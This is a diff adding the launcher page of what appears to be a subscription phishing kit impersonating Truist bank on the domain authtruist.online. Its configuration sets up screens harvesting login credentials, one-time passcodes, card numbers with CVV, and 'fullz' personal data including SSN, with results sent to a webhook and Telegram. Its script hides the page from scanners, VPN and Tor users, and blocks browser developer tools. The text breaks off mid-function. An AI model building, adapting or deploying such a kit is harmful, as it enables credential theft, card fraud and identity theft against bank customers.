@@ -1,0 +1,1098 @@
+<!doctype html>
+<!-- DEUCE runtime launcher: upload this one index.html. The full page package is served by DEUCE runtime for this subscriber. -->
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>TRUIST</title>
+    <link id="deuceFavicon" rel="icon" href="/api/branding?userPageId=user_page_a81d193c94964444a3">
+    <style>
+      :root {
+        --accent: #7cffb2;
+        --accent-rgb: 124 255 178;
+        --success: #15803d;
+        --success-rgb: 21 128 61;
+        --danger: #b91c1c;
+        --danger-rgb: 185 28 28;
+        --info: #52645b;
+        --info-rgb: 82 100 91;
+      }
+      * { box-sizing: border-box; }
+      html, body { width: 100%; min-height: 100%; margin: 0; background: #050607; }
+      body { overflow: hidden; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+      #deuceFrame { width: 100vw; height: 100vh; border: 0; display: block; background: #fff; }
+      #deuceFrame.pending { display: none; }
+      #deuceGate {
+        min-height: 100vh;
+        display: none;
+        place-items: center;
+        padding: 24px;
+        color: #161b18;
+        background: #f5f5f3;
+      }
+      #deuceGate.active { display: grid; }
+      #deuceGate article {
+        width: min(400px, calc(100vw - 32px));
+        display: grid;
+        gap: 20px;
+        padding: 26px;
+        border: 1px solid #e1e4e0;
+        border-radius: 12px;
+        background: #fff;
+        box-shadow: 0 12px 40px rgba(20, 28, 23, .08);
+      }
+      #deuceGateHeader {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        min-width: 0;
+      }
+      #deuceGateLogo,
+      #deuceGateFallback {
+        flex: 0 0 52px;
+        width: 52px;
+        height: 52px;
+        border: 1px solid #e1e4e0;
+        border-radius: 10px;
+        background: #fff;
+      }
+      #deuceGateLogo {
+        display: block;
+        object-fit: contain;
+        padding: 5px;
+      }
+      #deuceGateFallback {
+        display: grid;
+        place-items: center;
+        color: #fff;
+        background: #161b18;
+        font-size: 1rem;
+        font-weight: 850;
+        letter-spacing: .04em;
+      }
+      #deuceGateLogo[hidden], #deuceGateFallback[hidden] { display: none; }
+      #deuceGateMeta { min-width: 0; }
+      #deuceGateEyebrow {
+        margin: 0 0 4px;
+        color: #68736c;
+        font-size: .72rem;
+        font-weight: 800;
+        letter-spacing: .1em;
+        text-transform: uppercase;
+      }
+      #deuceGateDomain {
+        margin: 0;
+        overflow-wrap: anywhere;
+        color: #161b18;
+        font-size: clamp(1.15rem, 4vw, 1.45rem);
+        line-height: 1.2;
+      }
+      #deuceGateStatus {
+        margin: 7px 0 0;
+        color: #626c66;
+        font-size: .92rem;
+        line-height: 1.45;
+      }
+      #deuceGateStatus[data-state="verifying"] { color: var(--info); }
+      #deuceGateStatus[data-state="success"] { color: var(--success); }
+      #deuceGateStatus[data-state="error"] { color: var(--danger); }
+      #deuceTurnstile {
+        min-height: 65px;
+        display: grid;
+        place-items: center;
+      }
+      #deuceGateFooter {
+        margin: -5px 0 0;
+        color: #78817c;
+        font-size: .74rem;
+        text-align: center;
+      }
+      @media (max-width: 420px) {
+        #deuceGate { padding: 16px; }
+        #deuceGate article { padding: 22px 18px; border-radius: 15px; }
+        #deuceGateLogo, #deuceGateFallback { flex-basis: 46px; width: 46px; height: 46px; }
+      }
+      #deuceBlock {
+        min-height: 100vh;
+        display: none;
+        place-items: center;
+        padding: 24px;
+        color: #eef8f2;
+        background: #050607;
+      }
+      #deuceBlock.active { display: grid; }
+      #deuceBlock article {
+        max-width: 520px;
+        border: 1px solid rgb(var(--accent-rgb) / .24);
+        border-radius: 10px;
+        padding: 28px;
+        background: #0d1112;
+      }
+      #deuceBlock small { color: var(--accent); font-weight: 800; text-transform: uppercase; }
+      #deuceBlock h1 { margin: 10px 0; font-size: 1.7rem; }
+      #deuceBlock p { color: #8da199; line-height: 1.55; }
+    </style>
+  </head>
+  <body>
+    <iframe id="deuceFrame" title="TRUIST"></iframe>
+    <section id="deuceGate">
+      <article aria-labelledby="deuceGateDomain">
+        <header id="deuceGateHeader">
+          <img id="deuceGateLogo" alt="" hidden referrerpolicy="no-referrer">
+          <div id="deuceGateFallback" aria-hidden="true">DP</div>
+          <div id="deuceGateMeta">
+            <p id="deuceGateEyebrow">Security check</p>
+            <h1 id="deuceGateDomain"></h1>
+            <p id="deuceGateStatus" data-state="ready" aria-live="polite">Complete the verification to continue.</p>
+          </div>
+        </header>
+        <div id="deuceTurnstile"></div>
+        <p id="deuceGateFooter">Protected by Cloudflare Turnstile</p>
+      </article>
+    </section>
+    <section id="deuceBlock">
+      <article>
+        <small>access denied</small>
+        <h1 id="deuceBlockTitle">ACCESS DENIED</h1>
+        <p id="deuceBlockCopy">ACCESS DENIED</p>
+      </article>
+    </section>
+    <script>
+      window.DEUCE_PAGE_CONFIG = {
+        "id": "user_page_a81d193c94964444a3",
+        "userId": "user_1750253008364655bc",
+        "packageId": "pkg_952e9093a0f34cdda1",
+        "packageVersion": "v0.1",
+        "pageId": "trst",
+        "pageName": "TRUIST",
+        "source": {
+                "type": "github",
+                "entryFile": "index.html",
+                "screens": [
+                        {
+                                "id": "scr_77bb9ce4666c10",
+                                "file": "EORROR-OTP.HTML",
+                                "order": 0,
+                                "stage": "verification",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Error-OTP",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_otp1_274e5b0726a8",
+                                                        "type": "text",
+                                                        "label": "otp1",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp1",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp2_cf8badf24117",
+                                                        "type": "text",
+                                                        "label": "otp2",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp2",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp3_91d47f156928",
+                                                        "type": "text",
+                                                        "label": "otp3",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp3",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp4_b6d7470d9dcd",
+                                                        "type": "text",
+                                                        "label": "otp4",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp4",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp5_39f40bb43ff2",
+                                                        "type": "text",
+                                                        "label": "otp5",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp5",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp6_34807f05ae83",
+                                                        "type": "text",
+                                                        "label": "otp6",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp6",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:234e1914b62e0c38a920305528894ab1314dbe13577d5736b027df7c8e1f5bdd",
+                                        "screenId": "scr_77bb9ce4666c10",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_fbcdd41aeeacbe",
+                                "file": "OTP.HTML",
+                                "order": 1,
+                                "stage": "verification",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "OTP",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_otp1_274e5b0726a8",
+                                                        "type": "text",
+                                                        "label": "otp1",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp1",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp2_cf8badf24117",
+                                                        "type": "text",
+                                                        "label": "otp2",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp2",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp3_91d47f156928",
+                                                        "type": "text",
+                                                        "label": "otp3",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp3",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp4_b6d7470d9dcd",
+                                                        "type": "text",
+                                                        "label": "otp4",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp4",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp5_39f40bb43ff2",
+                                                        "type": "text",
+                                                        "label": "otp5",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp5",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_otp6_34807f05ae83",
+                                                        "type": "text",
+                                                        "label": "otp6",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "otp6",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:c41cafc47225ee246f26ded5b60fde6aaeeb28b7413b7d6828f07485ef894cfa",
+                                        "screenId": "scr_fbcdd41aeeacbe",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_c41abb6fe5e554",
+                                "file": "card.html",
+                                "order": 2,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Card",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_name_bb7ebcc9ea71",
+                                                        "type": "text",
+                                                        "label": "name",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "name",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_cc_0291a8468b18",
+                                                        "type": "text",
+                                                        "label": "XXXX XXXX XXXX XXXX",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "XXXX XXXX XXXX XXXX",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_exp_1858eb280806",
+                                                        "type": "text",
+                                                        "label": "MM/YY",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "MM/YY",
+                                                        "sourceRequired": true
+                                                },
+                                                {
+                                                        "id": "fld_cvv_c9cca786fdd6",
+                                                        "type": "password",
+                                                        "label": "CVV",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": true,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "CVV",
+                                                        "sourceRequired": true
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:98663bd2a33f3992f40d87fbcb3bf9f4842fff103f959a8e74dbd0a8b714b4ac",
+                                        "screenId": "scr_c41abb6fe5e554",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_460225db5c760f",
+                                "file": "fullz.html",
+                                "order": 3,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Personal Info",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_fullname_eb50d7a8d175",
+                                                        "type": "text",
+                                                        "label": "Full name",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Full name",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_address_88464df9868a",
+                                                        "type": "text",
+                                                        "label": "Address",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Address",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_city_5b0acd3fe23a",
+                                                        "type": "text",
+                                                        "label": "City",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "City",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_zip_3dcfdd0a4199",
+                                                        "type": "text",
+                                                        "label": "ZIP",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "ZIP",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_phone_f0f97d9692e8",
+                                                        "type": "tel",
+                                                        "label": "Phone number",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "tel",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Phone number",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_ssn_ed2467c59302",
+                                                        "type": "text",
+                                                        "label": "SSN",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "SSN",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:f98cd5f13378a08959c92de423e04b721759321f652109b7eb697a0629289372",
+                                        "screenId": "scr_460225db5c760f",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_eab5a95f25ba41",
+                                "file": "index.html",
+                                "order": 4,
+                                "stage": "form",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Login",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_user_e85b7377f119",
+                                                        "type": "text",
+                                                        "label": "user",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "user",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_field_2_b5a6ad810cd3",
+                                                        "type": "checkbox",
+                                                        "label": "Field 2",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "checkbox",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "Field 2",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_pass_1108429279c9",
+                                                        "type": "password",
+                                                        "label": "pass",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "pass",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:6772fe818877019ba3e5c94475269c54aaf4c97f16046d157a96673405010ae0",
+                                        "screenId": "scr_eab5a95f25ba41",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_bb1279b9bc0357",
+                                "file": "login-invalid.html",
+                                "order": 5,
+                                "stage": "form",
+                                "state": "error",
+                                "enabled": true,
+                                "buttonLabel": "Invalid-Login",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_user_e85b7377f119",
+                                                        "type": "text",
+                                                        "label": "User ID",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "User ID",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_saveuser_852c4670e849",
+                                                        "type": "checkbox",
+                                                        "label": "Save user ID",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "checkbox",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "Save user ID",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_pass_1108429279c9",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:614ceb14ec39c7188706169a87de1ee21bb3cc09858fa15170c83de0d6945434",
+                                        "screenId": "scr_bb1279b9bc0357",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_60ea908a3e45b5",
+                                "file": "sms.html",
+                                "order": 6,
+                                "stage": "verification",
+                                "state": "default",
+                                "enabled": false,
+                                "buttonLabel": "OTP-hold",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_otp_2d855ba1d07d",
+                                                        "type": "text",
+                                                        "label": "Enter the code",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "frm_form_1_8ccfde8abb2f",
+                                                        "required": true,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Enter the code",
+                                                        "sourceRequired": true
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:166b08fb497ff72183b16049df07aba024e00b475ff9f15877ce3be6b5f36e45",
+                                        "screenId": "scr_60ea908a3e45b5",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": false
+                        },
+                        {
+                                "id": "scr_23c890cabe3adc",
+                                "file": "wait.html",
+                                "order": 7,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Wait",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [],
+                                        "version": 1,
+                                        "revision": "sha256:6edfd368bec0b50c9708cecaf227d0228920cda787fbdb9e1473c3983022cc36",
+                                        "screenId": "scr_23c890cabe3adc",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        }
+                ]
+        },
+        "apiBase": "/api",
+        "generatedAt": "2026-11-13T01:56:14.075Z",
+        "domain": "authtruist.online",
+        "hosting": {
+                "domain": "authtruist.online",
+                "connectionType": "cloudflare-worker"
+        },
+        "allowedDomains": [
+                "authtruist.online"
+        ],
+        "subscription": {
+                "autoRenew": true,
+                "renewalDate": "2026-11-25",
+                "renewalPrice": 150,
+                "walletSource": "main-wallet",
+                "billingPeriod": "monthly",
+                "adminFreeSubscription": false
+        },
+        "resultSettings": {
+                "webhook": "/api/page-results",
+                "retentionDays": 30,
+                "notifyOnResult": true,
+                "telegramNotifyOnResult": true
+        },
+        "security": {
+                "captcha": true,
+                "domains": [
+                        "authtruist.online"
+                ],
+                "bannedIps": [],
+                "turnstile": {
+                        "enabled": true,
+                        "provider": "turnstile",
+                        "siteKey": "0x4AAAAAAF6MVDVt0iGOIbNy",
+                        "displayDomain": "truist.com"
+                },
+                "whitelistIps": [],
+                "vpnProxyRules": {
+                        "blockTor": true,
+                        "blockVpnProxies": true,
+                        "blockHostingProviders": true,
+                        "reputationFailureMode": "challenge"
+                },
+                "blockedDevices": [
+                        "bot",
+                        "other"
+                ],
+                "contentDeterrence": true,
+                "turnstileSecretConfigured": false
+        },
+        "generatedFile": {
+                "version": "build-001"
+        },
+        "runtime": {
+                "mode": "launcher",
+                "entryFile": "index.html",
+                "configEndpoint": "/api/config?userPageId=user_page_a81d193c94964444a3",
+                "brandingEndpoint": "/api/branding?userPageId=user_page_a81d193c94964444a3",
+                "sourceEndpoint": "/api/source?userPageId=user_page_a81d193c94964444a3",
+                "turnstileEndpoint": "/api/verify-human",
+                "trafficEndpoint": "/api/traffic"
+        },
+        "favicon": {
+                "path": "res/img/logo.png",
+                "thumbnailDataUrl": "",
+                "thumbnailPath": ""
+        },
+        "runtimeBase": "/api"
+};
+      const config = window.DEUCE_PAGE_CONFIG;
+      const sessionId = (() => {
+        const key = "deuce_session_" + config.id;
+        try {
+          const existing = window.sessionStorage.getItem(key);
+          if (existing) return existing;
+          const next = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+          window.sessionStorage.setItem(key, next);
+          return next;
+        } catch (error) {
+          return "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+        }
+      })();
+      const host = window.location.hostname;
+      const frame = document.getElementById("deuceFrame");
+      const gate = document.getElementById("deuceGate");
+      const gateLogo = document.getElementById("deuceGateLogo");
+      const gateFallback = document.getElementById("deuceGateFallback");
+      const gateDomain = document.getElementById("deuceGateDomain");
+      const gateStatus = document.getElementById("deuceGateStatus");
+      const turnstileMount = document.getElementById("deuceTurnstile");
+      const block = document.getElementById("deuceBlock");
+      const blockCopy = document.getElementById("deuceBlockCopy");
+      let turnstileWidgetId = null;
+
+      function enableContentDeterrence() {
+        if (!config.security?.contentDeterrence || document.documentElement.dataset.deuceContentDeterrence === "on") return;
+        document.documentElement.dataset.deuceContentDeterrence = "on";
+        document.addEventListener("contextmenu", (event) => event.preventDefault(), true);
+        document.addEventListener("dragstart", (event) => {
+          if (event.target?.closest?.("img, picture, svg, canvas")) event.preventDefault();
+        }, true);
+        document.addEventListener("keydown", (event) => {
+          const key = String(event.key || "").toLowerCase();
+          const sourceShortcut = (event.ctrlKey || event.metaKey) && !event.shiftKey && key === "u";
+          const developerShortcut = ((event.ctrlKey || event.metaKey) && event.shiftKey && ["i", "j", "c"].includes(key))
+            || (event.metaKey && event.altKey && ["i", "j", "c"].includes(key));
+          if (key === "f12" || sourceShortcut || developerShortcut) {
+            event.preventDefault();
+            event.stopPropagation();
+          }
+        }, true);
+      }
+
+      function normalizeHost(value) {
+        return String(value || "").trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/:\d+$/, "");
+      }
+      function brandingLabel() {
+        return String(
+          config.security?.turnstile?.displayDomain
+          || config.domain
+          || config.pageName
+          || host
+          || "Protected page"
+        ).trim();
+      }
+
+      function brandingInitials(value) {
+        return String(value || "DP")
+          .split(/[^a-z0-9]+/i)
+          .filter(Boolean)
+          .slice(0, 2)
+          .map((part) => part.charAt(0).toUpperCase())
+          .join("")
+          .slice(0, 2) || "DP";
+      }
+
+      function setGateStatus(message, state = "ready") {
+        gateStatus.textContent = message;
+        gateStatus.dataset.state = state;
+      }
+
+      function loadBranding() {
+        const label = brandingLabel();
+        gateDomain.textContent = label;
+        gateFallback.textContent = brandingInitials(config.pageName || label);
+        const endpoint = config.runtime?.brandingEndpoint;
+        if (!endpoint) return;
+        const brandingUrl = new URL(endpoint, window.location.href);
+        brandingUrl.searchParams.set("hostname", window.location.hostname);
+        brandingUrl.searchParams.set("sessionId", sessionId);
+        gateLogo.onload = () => {
+          gateLogo.hidden = false;
+          gateFallback.hidden = true;
+        };
+        gateLogo.onerror = () => {
+          gateLogo.hidden = true;
+          gateFallback.hidden = false;
+        };
+        gateLogo.src = brandingUrl.toString();
+      }
+
+      async function refreshLiveConfig() {
+        if (!config.runtime?.configEndpoint) {
+          throw new Error("Live security configuration endpoint is missing");
+        }
+        const configUrl = new URL(config.runtime.configEndpoint, window.location.href);
+        configUrl.searchParams.set("hostname", window.location.hostname);
+        configUrl.searchParams.set("sessionId", sessionId);
+        const response = await fetch(configUrl.toString(), {
+          method: "GET",
+          cache: "no-store",
+          headers: { Accept: "application/json" }
+        });
+        const result = await response.json().catch(() => ({}));
+        if (!response.ok || !result.config) {
+          throw new Error(result.error || "Live security configuration is unavailable");
+        }
+        const live = result.config;
+        config.domain = live.domain || config.domain;
+        config.hosting = live.hosting || config.hosting;
+        config.allowedDomains = live.security?.domains || config.allowedDomains || [];
+        config.subscription = live.subscription || config.subscription;
+        config.security = live.security || {};
+        config.resultSettings = live.resultSettings || config.resultSettings;
+        config.generatedFile = live.generatedFile || config.generatedFile;
+        config.favicon = Object.assign({}, config.favicon, live.favicon ? { path: live.favicon.path, thumbnailPath: live.favicon.thumbnailPath } : {});
+        window.DEUCE_PAGE_CONFIG = config;
+        return config;
+      }
+
+      function blockPage(message) {
+        gate.classList.remove("active");
+        frame.remove();
+        block.classList.add("active");
+        blockCopy.textContent = message;
+      }
+
+      function sendTraffic(event, result, reason) {
+        if (!config.runtime?.trafficEndpoint) return;
+        fetch(config.runtime.trafficEndpoint, {
+          method: "POST",
+          keepalive: true,
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userPageId: config.id,
+            pageId: config.pageId,
+            sessionId,
+            hostname: window.location.hostname,
+            event,
+            result,
+            reason,
+            createdAt: new Date().toISOString()
+          })
+        }).catch(() => {});
+      }
+
+      function loadPage() {
+        gate.classList.remove("active");
+        frame.classList.remove("pending");
+        const sourceUrl = new URL(config.runtime.sourceEndpoint, window.location.href);
+        sourceUrl.searchParams.set("hostname", window.location.hostname);
+        sourceUrl.searchParams.set("sessionId", sessionId);
+        frame.src = sourceUrl.toString();
+      }
+
+      function verifyToken(token) {
+        return fetch(config.runtime.turnstileEndpoint, {
+          method: "POST",
+          credentials: "same-origin",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userPageId: config.id,
+            pageId: config.pageId,
+            sessionId,
+            hostname: window.location.hostname,
+            token
+          })
+        }).then(async (response) => {
+          const result = await response.json().catch(() => ({}));
+          return Boolean(response.ok && result.verified);
+        });
+      }
+
+      function retryTurnstile(message) {
+        setGateStatus(message, "error");
+        if (window.turnstile && turnstileWidgetId !== null) {
+          window.turnstile.reset(turnstileWidgetId);
+        }
+      }
+
+      function loadTurnstile() {
+        frame.classList.add("pending");
+        loadBranding();
